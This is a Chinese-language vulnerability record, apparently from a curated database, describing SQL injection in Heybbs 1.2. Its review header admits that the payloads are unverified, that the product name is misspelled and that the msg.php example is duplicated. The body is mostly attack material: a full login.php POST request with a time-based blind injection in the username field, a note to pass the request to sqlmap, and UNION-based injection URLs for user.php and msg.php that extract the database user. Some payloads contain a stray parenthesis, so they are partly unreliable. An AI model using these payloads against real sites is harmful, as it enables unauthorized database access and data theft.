---
source: "hatch 补库批 20260928"
product: "Heybbs1.2"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "Heybbs 1.2 sql注入漏洞"
prerequisites: "来源所述条件，未列明部分仍待核：登录注入带有效验证码会话；另两端点鉴权不明"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-5bf4aac8c5b72913c75681ae"
entity_id: "ve-5bf4aac8c5b72913c75681ae"
schema_version: "1"
---

## 核对与使用边界


本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：登录注入带有效验证码会话；另两端点鉴权不明

- **代码与转录边界（1）**：产品Heybb与Heybbs拼写不一；msg.php例子重复两次。相应原代码作为存在此问题的历史样本保留，不能直接当作可运行、成功复现的 PoC；缺失内容需回原稿核对，不据此补造可执行攻击链。

- **结论使用边界（2）**：user/msg UNION样例有孤立右括号select1)，无原SQL上下文不能确认有效。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **适用与权限边界（3）**：三入口需独立实体/条件；只有请求无响应/时间差/源码/来源，验证码影响盲注请求未说明。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# Heybbs 1.2 sql注入漏洞

一、漏洞简介
------------

二、漏洞影响
------------

Heybb 1.2

三、复现过程
------------

**第一处注入存在于login.php文件的username参数处**

    POST /php/login.php HTTP/1.1
    Host: www.0-sec.org
    Content-Length: 98
    Cache-Control: max-age=0
    Upgrade-Insecure-Requests: 1
    Origin: http://www.0-sec.org
    Content-Type: application/x-www-form-urlencoded
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
    Referer: http://www.0-sec.org/login.php
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Cookie: PHPSESSID=qmpkek4l3ojr30gtodf6nj4hp4
    Connection: close

    username=123123' and (select 1 from (select(sleep(5)))accn) AND '1'='1&password=123123&verify=h4ir

> 将username标\*放入sqlmap -r

**第二处注入存在于user.php文件id参数处**

Eg:

`http://www.0-sec.org/user.php?id=177 and 1=2 union select 1) ,user(),3,4,5,6,7,8,9,10`

**第三处注入存在于msg.php文件id参数处**

Eg:

`http://www.0-sec.org/msg.php?id=1 and 1=2 union select 1) ,2,3,user(),5,6,7,8,9,10,11,12`

Eg:

`http://www.0-sec.org/msg.php?id=1 and 1=2 union select 1) ,2,3,user(),5,6,7,8,9,10,11,12`
